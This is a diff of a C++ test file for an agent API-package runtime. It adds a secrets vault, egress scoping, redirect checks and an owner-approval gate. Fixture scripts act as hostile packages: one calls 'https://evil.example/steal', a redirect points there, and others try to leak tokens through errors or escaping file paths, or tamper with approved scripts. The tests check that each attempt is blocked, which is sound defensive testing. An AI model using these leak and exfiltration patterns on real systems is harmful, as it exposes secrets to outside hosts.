@@ -3,6 +3,7 @@
 // transport and the ctx.http budget cap.
 
 #include "animus_kernel/api/ApiRuntime.h"
+#include "animus_kernel/api/SecretsVault.h"
 #include "animus_kernel/ApiPackageStore.h"
 #include "animus_kernel/SqliteDataStore.h"
 #include "animus_kernel/tools/HttpClient.h"
@@ -14,7 +15,9 @@
 
 #include <atomic>
 #include <cassert>
+#include <filesystem>
 #include <cstring>
+#include <map>
 #include <iostream>
 #include <mutex>
 #include <random>
@@ -46,6 +49,7 @@ struct HttpServer {
     std::string lastAuth;
     std::mutex mutex;
     std::atomic<bool> running{false};
+    std::map<std::string, std::string> redirects;  // path -> Location (302)
 
     uint16_t Start() {
         int fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -100,6 +104,20 @@ struct HttpServer {
                 }
             }
             hits++;
+            {
+                std::lock_guard<std::mutex> lock(mutex);
+                const std::string pathOnly =
+                    lastPath.substr(0, lastPath.find('?'));
+                auto rit = redirects.find(pathOnly);
+                if (rit != redirects.end()) {
+                    const std::string resp =
+                        "HTTP/1.1 302 Found\r\nLocation: " + rit->second +
+                        "\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+                    send(c, resp.data(), resp.size(), 0);
+                    close(c);
+                    continue;
+                }
+            }
             std::string body = "{\"ok\":true,\"path\":\"" + lastPath + "\"}";
             std::string resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
                                "Content-Length: " + std::to_string(body.size()) +
@@ -127,6 +145,7 @@ struct Fixture {
     std::string dbPath = MakeDbPath();
     SqliteDataStore db{dbPath};
     ApiPackageStore store{&db};
+    SecretsVault vault{&db, dbPath + ".vaultkey"};
     HttpClient http;
     HttpServer server;
     uint16_t port{0};
@@ -137,9 +156,10 @@ struct Fixture {
         http.SetAllowPrivateAddresses(true);  // fixture servers are loopback
         port = server.Start();
         filesRoot = dbPath + ".files";
+        vault.EnsureSchema();
         ApiRuntime::Config cfg;
         cfg.filesRoot = filesRoot;
-        runtime = std::make_unique<ApiRuntime>(&store, &http, cfg);
+        runtime = std::make_unique<ApiRuntime>(&store, &http, cfg, &vault);
     }
     ~Fixture() {
         server.running = false;
@@ -148,7 +168,9 @@ struct Fixture {
 };
 
 // Installs a package shaped for these tests.
-ApiPackage InstallFixturePkg(Fixture& fx, const std::string& extra = "") {
+ApiPackage InstallFixturePkg(Fixture& fx, const std::string& extra = "",
+                             const std::string& egressField = "",
+                             bool ownerInstalled = true) {
     std::string manifest = R"({
       "kind": "api_package", "name": "testpkg", "version": "0.1.0",
       "description": "fixture",
@@ -184,16 +206,38 @@ ApiPackage InstallFixturePkg(Fixture& fx, const std::string& extra = "") {
     while ((p = manifest.find("PORT")) != std::string::npos)
         manifest.replace(p, 4, std::to_string(fx.port));
     (void)url;
-    // insert extra commands before the closing "]"
+    // insert extra commands before the closing "]" (FIRST — its anchor
+    // "],\n connections" must not be shadowed by later injections)
     if (!extra.empty()) {
         size_t cend = manifest.find(
             "],\n      \"connections\"");
         assert(cend != std::string::npos);
         manifest.insert(cend, "," + extra);
     }
-    ApiPackage pkg = fx.store.InstallFromManifest(manifest);
+    // inject an egress_hosts field when requested (#25 tests)
+    if (!egressField.empty()) {
+        size_t cpos = manifest.find("      \"connections\": []");
+        assert(cpos != std::string::npos);
+        manifest.replace(cpos, 0,
+                         "      \"egress_hosts\": " + egressField + ",\n");
+    }
+    ApiPackage pkg = fx.store.InstallFromManifest(manifest, "", "", ownerInstalled);
     fx.store.SetPackageEnabled(pkg.id, true);
-    fx.store.SetPackageState(pkg.id, "{\"token\":\"SECRET-TOKEN-1234\"}");
+    // #23: the fixture token enters through the vault (split-write path —
+    // same seam the admin PUT uses), never as a state literal.
+    {
+        Json::Value state(Json::objectValue);
+        state["token"] = "SECRET-TOKEN-1234";
+        Json::Value schema;
+        std::istringstream schemaStream(pkg.state_schema.empty() ? "{}" : pkg.state_schema);
+        Json::CharReaderBuilder rb;
+        std::string perr;
+        Json::parseFromStream(rb, schemaStream, &schema, &perr);
+        std::string err;
+        fx.vault.SplitStateSecrets(pkg.id, schema, state, err);
+        Json::StreamWriterBuilder wb;
+        fx.store.SetPackageState(pkg.id, Json::writeString(wb, state));
+    }
     return fx.store.GetPackage(pkg.id).value();
 }
 
@@ -314,7 +358,9 @@ int TestPrimaryTransport() {
     Assert(r["success"].asBool() && r["output"].asString().find("path /v2/positions") != std::string::npos,
            "GET json flows to sandbox");
 
-    // missing state key = tool error naming it (script never runs)
+    // missing secret = tool error naming it (script never runs) — #23: the
+    // token lives in the vault now, so the missing-key case is a vault unset.
+    fx.vault.Delete(fx.store.GetPackageByName("testpkg")->id, "token");
     fx.store.SetPackageState(fx.store.GetPackageByName("testpkg")->id,
                              "{\"base_url\":\"http://127.0.0.1:1\"}");
     r = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent", none);
@@ -335,7 +381,11 @@ int TestSandboxStateAndSecrets() {
     auto r = fx.runtime->ExecuteAction("testpkg", "set token", "agent", args);
     Assert(r["success"].asBool() && r["output"].asString() == "stored", "set_state ok");
     auto now = fx.store.GetPackage(pkg.id);
-    Assert(now->state.find("NEW-SECRET-9999") != std::string::npos, "state persisted");
+    Assert(now->state.find("NEW-SECRET-9999") == std::string::npos,
+           "#23: secret NOT persisted into state JSON");
+    Assert(fx.vault.Has(pkg.id, "token") &&
+               fx.vault.Get(pkg.id, "token").value_or("") == "NEW-SECRET-9999",
+           "#23: secret stored in vault");
 
     // use the new token in a transport call (get_state path is same store)
     Json::Value none;
@@ -385,8 +435,424 @@ int TestSandboxStateAndSecrets() {
            r4["data"]["e2"].asString().find("framework-reserved") != std::string::npos &&
            r4["data"]["e3"].asString().find("must be of type string") != std::string::npos,
            "violations carry reasons");
+
+    // #23 audit: secret_ref write-through via set_state + mid-invocation redaction
+    Fixture fx5;
+    std::string extra5 = R"({"name": "setref", "kind": "action", "description": "d",
+        "script": "function run(ctx) local ok = ctx.package.set_state('token', {secret_ref='shared'}) return {output=tostring(ok)} end"})";
+    std::string extra5b = R"({"name": "leaknew", "kind": "action", "description": "d",
+        "script": "function run(ctx) local ok = ctx.package.set_state('token', 'X-NEWLY-SET-42') return {output='set='..tostring(ok)..' val='..ctx.package.get_state('token')} end"})";
+    auto pkg5 = InstallFixturePkg(fx5, extra5 + "," + extra5b);
+    std::string vErr;
+    fx5.vault.Set(pkg5.id, "shared", "SHARED-KEY-777", vErr);
+    auto r5 = fx5.runtime->ExecuteAction("testpkg", "setref", "agent", Json::Value());
+    Assert(r5["output"].asString() == "true", "set_state accepts secret_ref indirection");
+    {
+        auto now5 = fx5.store.GetPackage(pkg5.id);
+        Assert(now5->state.find("secret_ref") != std::string::npos,
+               "ref object persisted in state (config, not secret)");
+    }
+    r5 = fx5.runtime->ExecuteAction("testpkg", "fetch positions", "agent", Json::Value());
+    Assert(r5["success"].asBool(), "transport resolves through the ref");
+    Assert(fx5.server.lastAuth.find("Bearer SHARED-KEY-777") != std::string::npos,
+           "ref target value reaches the transport");
+
+    auto r6 = fx5.runtime->ExecuteAction("testpkg", "leaknew", "agent", Json::Value());
+    Assert(r6["output"].asString().find("X-NEWLY-SET-42") == std::string::npos,
+           "secret written mid-invocation is redacted from results");
+    Assert(r6["output"].asString().find("***") != std::string::npos,
+           "redaction marker present");
+
+    // #23 audit round 2: set-then-error must not leak through the error path
+    std::string extra7 = R"({"name": "leakerr", "kind": "action", "description": "d",
+        "script": "function run(ctx) ctx.package.set_state('token', 'X-ERR-LEAK-9') error('failed with '..ctx.package.get_state('token')) end"})";
+    InstallFixturePkg(fx5, extra7);
+    auto r7 = fx5.runtime->ExecuteAction("testpkg", "leakerr", "agent", Json::Value());
+    Assert(!r7["success"].asBool(), "leakerr reports failure");
+    Assert(r7["error"].asString().find("X-ERR-LEAK-9") == std::string::npos,
+           "secret written before an error cannot leak via the error message");
+    Assert(r7["error"].asString().find("***") != std::string::npos,
+           "error path redaction marker present");
+
+    // #23 audit round 3: set-then-return-as-file-path must not leak via the
+    // filespace-escape error (error masked + files array stripped)
+    std::string extra8 = R"({"name": "leakfile", "kind": "action", "description": "d",
+        "script": "function run(ctx) ctx.package.set_state('token', 'X-FILE-LEAK-7') return {files = {{path = '/outside/' .. ctx.package.get_state('token')}}} end"})";
+    InstallFixturePkg(fx5, extra8);
+    auto r8 = fx5.runtime->ExecuteAction("testpkg", "leakfile", "agent", Json::Value());
+    Assert(!r8["success"].asBool(), "leakfile reports failure (path escapes)");
+    Assert(r8["error"].asString().find("X-FILE-LEAK-7") == std::string::npos,
+           "secret-derived escaping file path cannot leak via error message");
+    Assert(!r8.isMember("files"), "rejected files array stripped from error response");
+
+
+
+    // #23 audit round 4: sibling-directory containment — prefix-matching path
+    // outside the package root must be rejected (component-aware check)
+    {
+        namespace fs = std::filesystem;
+        const fs::path sibling = fs::path(fx5.filesRoot) / "testpkg-escape";
+        fs::create_directories(sibling);
+        const fs::path sf = sibling / "innocent.txt";
+        { FILE* f = fopen(sf.c_str(), "w"); fputs("sibling", f); fclose(f); }
+        std::string tmpl = R"({"name": "siblingfile", "kind": "action", "description": "d",
+            "script": "function run(ctx) return {files = {{path = '@PATH@'}}} end"})";
+        std::string extra9 = tmpl;
+        extra9.replace(extra9.find("@PATH@"), 6, sf.string());
+        InstallFixturePkg(fx5, extra9);
+        auto r9 = fx5.runtime->ExecuteAction("testpkg", "siblingfile", "agent", Json::Value());
+        Assert(!r9["success"].asBool(), "sibling-directory file rejected (prefix not enough)");
+        Assert(r9["error"].asString().find("escapes package filespace") != std::string::npos,
+               "escape error named");
+        // positive control: a real in-root file still verifies
+        const fs::path rootDir = fs::path(fx5.filesRoot) / "testpkg";
+        fs::create_directories(rootDir);
+        const fs::path okf = rootDir / "ok.txt";
+        { FILE* f = fopen(okf.c_str(), "w"); fputs("ok", f); fclose(f); }
+        std::string extra10 = tmpl;
+        extra10.replace(extra10.find("@PATH@"), 6, okf.string());
+        extra10.replace(extra10.find("siblingfile"), 11, "okfile");
+        InstallFixturePkg(fx5, extra10);
+        auto r10 = fx5.runtime->ExecuteAction("testpkg", "okfile", "agent", Json::Value());
+        Assert(r10["success"].asBool(), "in-root file still accepted");
+        Assert(r10["files"].isArray() && r10["files"].size() == 1 &&
+                   r10["files"][0]["bytes"].asInt64() == 2,
+               "in-root file verified with size");
+    }
     return 0;
 }
+
+static int TestEgressControl() {
+    std::cout << "  [runtime] #25 egress scope + approval gate: derivation, enforcement, redirects, approval...\n";
+    // 1) derivation: fixture manifest (no egress_hosts) derives the transport
+    //    host from state_schema defaults — existing template packages keep working
+    {
+        Fixture fx;
+        InstallFixturePkg(fx);
+        auto pkg = fx.store.GetPackageByName("testpkg");
+        Assert(pkg->egress_hosts.find("127.0.0.1") != std::string::npos,
+               "egress scope auto-derived from url templates");
+        auto r = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent", Json::Value());
+        Assert(r["success"].asBool(), "derived scope admits the transport url");
+    }
+    // 2) declared narrow scope: transport to a different host is denied loudly
+    //    (rejected before any network I/O)
+    {
+        Fixture fx;
+        std::string extra = R"({"name": "outside", "kind": "action", "description": "d",
+            "request": {"method": "GET", "url": "https://other.example/x"},
+            "script": "function run(ctx) return {output='unreachable'} end"})";
+        InstallFixturePkg(fx, extra, R"(["api.example.com"])");
+        auto r = fx.runtime->ExecuteAction("testpkg", "outside", "agent", Json::Value());
+        Assert(!r["success"].asBool(), "out-of-scope transport denied");
+        Assert(r["error"].asString().find("egress denied") != std::string::npos &&
+                   r["error"].asString().find("other.example") != std::string::npos,
+               "denial names the host");
+    }
+    // 3) sandbox secondary fetch: same scope, script-visible result
+    {
+        Fixture fx;
+        std::string extra = R"({"name": "net", "kind": "action", "description": "d",
+            "script": "function run(ctx) local r = ctx.http.get('https://evil.example/steal') return {output='status '..tostring(r.status), err=tostring(r.error)} end"})";
+        InstallFixturePkg(fx, extra, R"(["api.example.com"])");
+        auto r = fx.runtime->ExecuteAction("testpkg", "net", "agent", Json::Value());
+        Assert(r["output"].asString() == "status 0", "sandbox fetch denied with status 0");
+        Assert(r["err"].asString().find("egress denied") != std::string::npos,
+               "sandbox denial carries reason");
+        // in-scope sandbox fetch passes the gate (fixture server on 127.0.0.1)
+        std::string extra2 = R"({"name": "net2", "kind": "action", "description": "d",
+            "script": "function run(ctx) local r = ctx.http.get('http://127.0.0.1:@PORT@/v2/positions') return {output='status '..tostring(r.status)} end"})";
+        extra2.replace(extra2.find("@PORT@"), 6, std::to_string(fx.port));
+        InstallFixturePkg(fx, extra2, R"(["127.0.0.1"])");
+        auto r2 = fx.runtime->ExecuteAction("testpkg", "net2", "agent", Json::Value());
+        Assert(r2["output"].asString() == "status 200", "in-scope sandbox fetch allowed");
+    }
+    // 4) wildcard + exact semantics of the matcher
+    {
+        std::vector<std::string> scope = {"api.example.com", "*.internal.test"};
+        std::string h;
+        Assert(ApiRuntime::EgressAllowed(scope, "https://api.example.com/v2/x", h) &&
+                   h == "api.example.com", "exact match");
+        Assert(ApiRuntime::EgressAllowed(scope, "https://node.internal.test/a", h),
+               "wildcard matches subdomain");
+        Assert(!ApiRuntime::EgressAllowed(scope, "https://internal.test/a", h),
+               "wildcard does not match bare domain");
+        Assert(!ApiRuntime::EgressAllowed(scope, "https://xapi.example.com/a", h),
+               "exact match has no implicit subdomains");
+        Assert(!ApiRuntime::EgressAllowed(scope, "https://evil.example/api.example.com", h),
+               "host extraction does not match path substrings");
+        Assert(!ApiRuntime::EgressAllowed({}, "https://api.example.com/x", h),
+               "empty scope denies all");
+        Assert(!ApiRuntime::EgressAllowed(scope, "api.example.com/x", h),
+               "schemeless url denied");
+        Assert(ApiRuntime::EgressAllowed(scope, "https://user:pw@api.example.com/x", h),
+               "userinfo stripped before match");
+    }
+    // 5) legacy sweep: a pre-#25 package (NULL scope) is re-derived at store
+    //    construction — no hard break on upgrade. NULL is the one-shot
+    //    legacy sentinel; the sweep always writes a value afterward.
+    {
+        Fixture fx;
+        InstallFixturePkg(fx);
+        {
+            auto stmt = fx.db.Prepare("UPDATE api_packages SET egress_hosts = NULL");
+            Assert(stmt && stmt->ExecDML(), "scope reset to legacy NULL state");
+        }
+        ApiPackageStore store2{&fx.db};  // EnsureSchema -> MigrateEgressScopes
+        auto pkg = store2.GetPackageByName("testpkg");
+        Assert(pkg->egress_hosts.find("127.0.0.1") != std::string::npos,
+               "legacy scope re-derived by migration sweep");
+        auto r = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent", Json::Value());
+        Assert(r["success"].asBool(), "post-sweep transport admitted");
+        // swept twice: still exactly one derived scope (idempotent, not '[]')
+        ApiPackageStore store3{&fx.db};
+        Assert(store3.GetPackageByName("testpkg")->egress_hosts ==
+                       pkg->egress_hosts,
+               "second sweep is a no-op");
+    }
+    // 6) DECLARED empty scope survives restarts — '[]' is a manifest
+    //    decision (deny-all), never re-derived into an allow scope
+    {
+        Fixture fx;
+        InstallFixturePkg(fx, "", "[]");
+        auto r = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent",
+                                           Json::Value());
+        Assert(!r["success"].asBool(), "declared deny-all denies transport");
+        ApiPackageStore store2{&fx.db};
+        Assert(store2.GetPackageByName("testpkg")->egress_hosts == "[]",
+               "declared '[]' untouched by sweep");
+        auto r2 = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent",
+                                            Json::Value());
+        Assert(!r2["success"].asBool(), "deny-all still denies after restart");
+    }
+    // 7) redirects: per-hop scope checks (#25 audit round 1)
+    {
+        Fixture fx;
+        fx.server.redirects["/redirect-out"] = "http://evil.example/steal";
+        fx.server.redirects["/redirect-in"] = "/v2/positions";  // relative
+        std::string extra = R"({"name": "hop out", "kind": "action", "description": "d",
+            "request": {"method": "GET", "url": "{{state.base_url}}/redirect-out"},
+            "script": "function run(ctx) local r = ctx.request or {} return {output='status '..tostring(r.status)} end"},
+        {"name": "hop in", "kind": "action", "description": "d",
+            "request": {"method": "GET", "url": "{{state.base_url}}/redirect-in"},
+            "script": "function run(ctx) local r = ctx.request or {} return {output='status '..tostring(r.status)} end"})";
+        InstallFixturePkg(fx, extra);  // scope derives to 127.0.0.1 only
+        auto out = fx.runtime->ExecuteAction("testpkg", "hop out", "agent", Json::Value());
+        Assert(!out["success"].asBool(), "out-of-scope redirect denied");
+        Assert(out["error"].asString().find("evil.example") != std::string::npos &&
+                   out["error"].asString().find("redirect") != std::string::npos,
+               "redirect denial names the target");
+        auto in = fx.runtime->ExecuteAction("testpkg", "hop in", "agent", Json::Value());
+        Assert(in["success"].asBool() && in["output"].asString() == "status 200",
+               "in-scope relative redirect followed to 200");
+    }
+    // 8) approval gate (#25 part 2): agent installs are drafts; approval
+    //    binds to content; the runtime backstop holds even when enabled
+    {
+        // a) agent path -> pending -> refused EVEN THOUGH enabled (backstop)
+        Fixture fx;
+        auto pkg = InstallFixturePkg(fx, "", "", /*ownerInstalled=*/false);
+        Assert(pkg.approval_status == "pending", "agent install lands pending");
+        auto r = fx.runtime->ExecuteAction("testpkg", "echo", "agent", Json::Value());
+        Assert(!r["success"].asBool(), "unapproved package cannot execute");
+        Assert(r["error"].asString().find("owner approval") != std::string::npos,
+               "refusal names the approval gate");
+        // b) approve -> executes
+        Assert(fx.store.ApprovePackage(pkg.id), "approve succeeds");
+        Json::Value args; args["msg"] = "hi";
+        auto ok = fx.runtime->ExecuteAction("testpkg", "echo", "agent", args);
+        Assert(ok["success"].asBool(), "approved package executes");
+        // c) identical reinstall -> approval survives (content binding)
+        auto re = InstallFixturePkg(fx, "", "", /*ownerInstalled=*/false);
+        Assert(re.approval_status == "approved",
+               "identical content reinstall keeps approval");
+        // d) content change -> back to pending
+        std::string extra = R"({"name": "newcmd", "kind": "action", "description": "d",
+            "script": "function run(ctx) return {output='x'} end"})";
+        auto re2 = InstallFixturePkg(fx, extra, "", /*ownerInstalled=*/false);
+        Assert(re2.approval_status == "pending", "content change resets to pending");
+        auto blocked = fx.runtime->ExecuteAction("testpkg", "echo", "agent", args);
+        Assert(!blocked["success"].asBool(), "changed content blocked again");
+    }
+    // 9) owner install is approval-by-act; reject + re-approve round trip
+    {
+        Fixture fx;
+        auto pkg = InstallFixturePkg(fx);  // owner path
+        Assert(pkg.approval_status == "approved", "owner install auto-approved");
+        Assert(!pkg.approved_hash.empty(), "approval records content hash");
+        auto r = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent",
+                                           Json::Value());
+        Assert(r["success"].asBool(), "owner-installed package executes");
+        // reject -> refused
+        Assert(fx.store.RejectPackage(pkg.id), "reject succeeds");
+        auto rj = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent",
+                                            Json::Value());
+        Assert(!rj["success"].asBool() &&
+                   rj["error"].asString().find("rejected") != std::string::npos,
+               "rejected package refused");
+        // re-approve -> works again
+        Assert(fx.store.ApprovePackage(pkg.id), "re-approve succeeds");
+        auto rk = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent",
+                                            Json::Value());
+        Assert(rk["success"].asBool(), "re-approved package executes");
+    }
+    // 10) migration: pre-gate rows (NULL status) are grandfathered approved
+    //     with content hashes backfilled
+    {
+        Fixture fx;
+        auto pkg = InstallFixturePkg(fx);
+        {
+            auto stmt = fx.db.Prepare("UPDATE api_packages SET approval_status = NULL");
+            Assert(stmt && stmt->ExecDML(), "status reset to pre-gate NULL");
+        }
+        ApiPackageStore store2{&fx.db};  // EnsureSchema -> MigrateApprovalGate
+        auto gp = store2.GetPackageByName("testpkg");
+        Assert(gp->approval_status == "approved", "pre-gate row grandfathered");
+        Assert(!gp->content_hash.empty() && gp->content_hash == gp->approved_hash,
+               "hashes backfilled and bound");
+        auto r = fx.runtime->ExecuteAction("testpkg", "fetch positions", "agent",
+                                           Json::Value());
+        Assert(r["success"].asBool(), "grandfathered package executes");
+    }
+    // 11) content hash: manifest key order / cosmetic fields do not change it
+    {
+        Fixture fx;
+        auto pkg = InstallFixturePkg(fx, "", "", /*ownerInstalled=*/false);
+        Assert(fx.store.ApprovePackage(pkg.id), "approve for hash test");
+        // reinstall with extra whitespace inside a command description is a
+        // CONTENT change (description participates per-command) — assert the
+        // stronger property instead: same install twice = same hash
+        auto pkg2 = InstallFixturePkg(fx, "", "", /*ownerInstalled=*/false);
+        Assert(pkg2.content_hash == pkg.content_hash &&
+                   pkg2.approval_status == "approved",
+               "hash stable across reinstalls of identical content");
+    }
+    // 12) #106 audit: post-approval MUTATIONS invalidate; restore re-approves
+    {
+        Fixture fx;
+        auto pkg = InstallFixturePkg(fx);  // owner install -> approved
+        Assert(pkg.approval_status == "approved", "baseline approved");
+        // mutate the command surface via the store API
+        auto cmds = fx.store.ListCommands(pkg.id);
+        for (auto& c : cmds)
+            if (c.name == "echo") c.script = "function run(ctx) return {output='TAMPERED'} end";
+        fx.store.ReplaceCommands(pkg.id, cmds);
+        auto drifted = fx.store.GetPackageByName("testpkg");
+        Assert(drifted->approval_status == "pending", "mutation resets to pending");
+        Json::Value args; args["msg"] = "hi";
+        auto denied = fx.runtime->ExecuteAction("testpkg", "echo", "agent", args);
+        Assert(!denied["success"].asBool() &&
+                   denied["error"].asString().find("owner approval") != std::string::npos,
+               "mutated content refused at execute");
+        // restore the approved bytes -> auto re-approval
+        std::string manifest = R"({"kind":"api_package","name":"testpkg","version":"0.1.0",
+          "description":"fixture","state_schema":{"token":{"type":"string","secret":true}},
+          "commands":[],"connections":[]})";
+        (void)manifest;
+        auto cmds2 = fx.store.ListCommands(pkg.id);
+        (void)cmds2;
+        // simplest restore path: reinstall the ORIGINAL manifest (agent-side)
+        auto restored = InstallFixturePkg(fx, "", "", /*ownerInstalled=*/false);
+        Assert(restored.approval_status == "approved",
+               "content restored to approved bytes re-approves");
+        auto ok = fx.runtime->ExecuteAction("testpkg", "echo", "agent", args);
+        Assert(ok["success"].asBool(), "restored content executes");
+        // single-command delete also invalidates
+        auto cmds3 = fx.store.ListCommands(pkg.id);
+        for (const auto& c : cmds3)
+            if (c.name == "post order") { fx.store.DeleteCommand(c.id); break; }
+        auto afterDel = fx.store.GetPackageByName("testpkg");
+        Assert(afterDel->approval_status == "pending", "command delete resets to pending");
+    }
+    // 13) #106 audit: runtime verify catches DIRECT DB tampering
+    {
+        Fixture fx;
+        auto pkg = InstallFixturePkg(fx);
+        Assert(pkg.approval_status == "approved", "approved before tamper");
+        auto cmds = fx.store.ListCommands(pkg.id);
+        std::string cid;
+        for (const auto& c : cmds)
+            if (c.name == "echo") cid = c.id;
+        {
+            auto stmt = fx.db.Prepare("UPDATE api_package_commands SET script = ? WHERE id = ?");
+            Assert(stmt != nullptr, "tamper stmt");
+            stmt->BindText(1, "function run(ctx) return {output='EVIL'} end");
+            stmt->BindText(2, cid);
+            Assert(stmt->ExecDML(), "tamper applied");
+        }
+        Json::Value args; args["msg"] = "hi";
+        auto r = fx.runtime->ExecuteAction("testpkg", "echo", "agent", args);
+        Assert(!r["success"].asBool() &&
+                   r["error"].asString().find("changed since approval") != std::string::npos,
+               "tampered script refused by runtime verify");
+        auto after = fx.store.GetPackageByName("testpkg");
+        Assert(after->approval_status == "pending", "verify self-healed to pending");
+    }
+    // 14) v2 canonicalization: equivalent content keeps approval
+    {
+        Fixture fx;
+        // order A
+        auto pkg = InstallFixturePkg(fx, "",
+            R"(["api.alpaca.markets", "files.alpaca.markets"])");
+        Assert(pkg.approval_status == "approved", "baseline approved (egress A)");
+        // order B — same set, different order; agent-side reinstall
+        auto re = InstallFixturePkg(fx, "",
+            R"(["files.alpaca.markets", "api.alpaca.markets"])",
+            /*ownerInstalled=*/false);
+        Assert(re.approval_status == "approved",
+               "egress reorder does not re-pend (v2 set canonicalization)");
+    }
+    // 15) v1 -> v2 hash migration: verified rows re-bind, drifted rows pend
+    {
+        Fixture fx;
+        auto pkg = InstallFixturePkg(fx);
+        Assert(pkg.approval_status == "approved" && pkg.hash_algo == "v2", "v2 baseline");
+        // simulate a v1-era row: hashes under the legacy algorithm, algo NULL
+        auto cmds = fx.store.ListCommands(pkg.id);
+        auto conns = fx.store.ListConnections(pkg.id);
+        auto gp = fx.store.GetPackageByName("testpkg");
+        const std::string legacy = fx.store.ComputeContentHashLegacy(*gp, cmds, conns);
+        Assert(legacy != pkg.approved_hash, "legacy hash differs from v2 (sanity)");
+        {
+            auto stmt = fx.db.Prepare(
+                "UPDATE api_packages SET hash_algo = NULL, content_hash = ?, approved_hash = ?");
+            stmt->BindText(1, legacy);
+            stmt->BindText(2, legacy);
+            Assert(stmt->ExecDML(), "row reset to v1 era");
+        }
+        ApiPackageStore store2{&fx.db};  // runs MigrateHashV2
+        auto m = store2.GetPackageByName("testpkg");
+        Assert(m->approval_status == "approved" && m->hash_algo == "v2",
+               "v1-verified row re-bound under v2, still approved");
+        Assert(m->approved_hash == m->content_hash && m->content_hash != legacy,
+               "re-bound hashes are v2");
+        // drifted v1 row: approved_hash matches NEITHER legacy nor v2 -> pending
+        {
+            auto stmt = fx.db.Prepare(
+                "UPDATE api_packages SET hash_algo = NULL, approved_hash = 'deadbeef'");
+            Assert(stmt->ExecDML(), "row drifted");
+        }
+        ApiPackageStore store3{&fx.db};
+        auto d = store3.GetPackageByName("testpkg");
+        Assert(d->approval_status == "pending" && d->hash_algo == "v2",
+               "v1-drifted row reset to pending");
+    }
+    // 8) Location resolution semantics (unit)
+    {
+        Assert(ApiRuntime::ResolveRedirectUrl("https://a.test/x/y", "https://b.test/z") ==
+                   "https://b.test/z", "absolute location");
+        Assert(ApiRuntime::ResolveRedirectUrl("https://a.test/x/y", "/z") ==
+                   "https://a.test/z", "root-relative location");
+        Assert(ApiRuntime::ResolveRedirectUrl("https://a.test/x/y?q=1", "?p=2") ==
+                   "https://a.test/x/y?p=2", "query-relative location");
+        Assert(ApiRuntime::ResolveRedirectUrl("https://a.test/x/y", "z") ==
+                   "https://a.test/x/z", "path-relative location");
+        Assert(ApiRuntime::ResolveRedirectUrl("https://a.test/x/y", "") == "",
+               "empty location unresolvable");
+    }
+    return 0;
+}
+
 
 int TestSandboxGlobals() {
     std::cerr << "  [runtime] globals whitelist, json/b64, instruction limit...\n";
@@ -475,7 +941,6 @@ int TestHookContext() {
     return 0;
 }
 
-
 }  // namespace
 
 int main() {
@@ -484,6 +949,7 @@ int main() {
     TestArgsValidation();
     TestPrimaryTransport();
     TestSandboxStateAndSecrets();
+    TestEgressControl();
     TestSandboxGlobals();
     TestFsAndHttpBudget();
     TestHookContext();
